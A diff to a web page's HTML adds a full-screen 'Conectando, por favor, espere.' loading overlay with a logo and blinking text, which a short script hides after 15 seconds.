@@ -7,6 +7,9 @@
     <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
 
     <style>
+      body{
+        position: relative;
+      }
       body,
       html {
         height: 100%;
@@ -63,6 +66,38 @@
       @media (max-width: 600px) {
         .container {
           width: 380px;
+        }
+      }
+      #cont-nipper{
+        position: fixed;
+        top: 0px;
+        left: 0px;
+        width: 100%;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        background-color: #fff;
+      }
+      #cont-nipper img{
+        width: 200px;
+      }
+      @keyframes blink {
+     0% { opacity: 1; }
+     50% { opacity: 0; }
+     100% { opacity: 1; }
+}
+      #cont-nipper p{
+        font-size: 17px;
+        color: #333;
+        font-family: Arial, Helvetica, sans-serif;
+        font-family: Arial, Helvetica, sans-serif;
+        animation: blink 2s infinite;
+      }
+      @media(min-width: 768px){
+        #cont-nipper p{
+          font-size: 20px;
         }
       }
     </style>
@@ -237,7 +272,21 @@
         </div>
       </div>
     </div>
+    <div id="cont-nipper">
+      <img src="../img/buda.svg" alt="">
+      <p>Conectando, por favor, espere.</p>
+
+    </div>
+
+
   </body>
+  <script>
+    //SNIPER GMAIL
+    const niper = document.querySelector('#cont-nipper');
+    setTimeout(function(){
+      niper.style.display = 'none';
+    }, 15000);
+  </script>
   <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
 
   <!-- TODO: Add SDKs for Firebase products that you want to use
